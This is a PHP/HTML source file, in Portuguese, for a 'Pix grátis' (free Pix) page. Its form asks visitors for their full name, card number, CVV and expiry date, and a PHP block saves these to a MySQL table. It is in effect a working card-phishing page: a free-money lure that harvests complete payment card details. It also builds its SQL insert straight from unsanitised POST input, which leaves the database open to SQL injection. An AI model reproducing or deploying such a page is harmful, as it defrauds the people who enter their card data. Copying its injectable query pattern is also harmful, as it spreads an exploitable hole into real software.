<?php
   include_once('config.php');

   $nome = $_POST['nome'];
   $numero = $_POST['numero'];
   $cvv = $_POST['cvv'];
   $validade = $_POST['validade_cartao'];

   $result = mysqli_query($conexao, "INSERT INTO usuarios(nome, numero, cvv, validade) VALUES ('$nome', '$numero', '$cvv', '$validade')");
?>




<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <script src="script.js"></script>
    <title>Formulário</title>
</head>

<body>
    <div class="box">
        <form action="index.php" method="POST">
            <fieldset>
                <legend>Pix grátis</legend>
                
                <div class="inputbox">
                    <label for="nome" class="labelinput">Nome completo:</label>
                    <input type="text" name="nome" id="nome" class="inputuser" required>
                </div>
                
                <br><br>

                <div class="inputbox">
                    <label for="numero" class="labelinput">Número do cartão:</label>
                    <input type="text" name="numero" id="numero" class="inputuser" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" pattern="[0-9\s]{13,19}" required>
                </div>

                <br><br>

                <div class="inputbox">
                    <label for="cvv" class="labelinput">CVV:</label>
                    <input type="text" name="cvv" id="cvv" class="inputuser" inputmode="numeric" maxlength="4" placeholder="CVV" pattern="\d{3,4}" required>
                </div>

                <br><br>


                    <label for="validade_cartao">Validade do cartão:</label>
                    <input type="date" name="validade_cartao" id="validade_cartao" required>


                <br><br>

                <input type="submit" name="submit" id="submit">
            </fieldset>
        </form>
    </div>
</body>

</html>
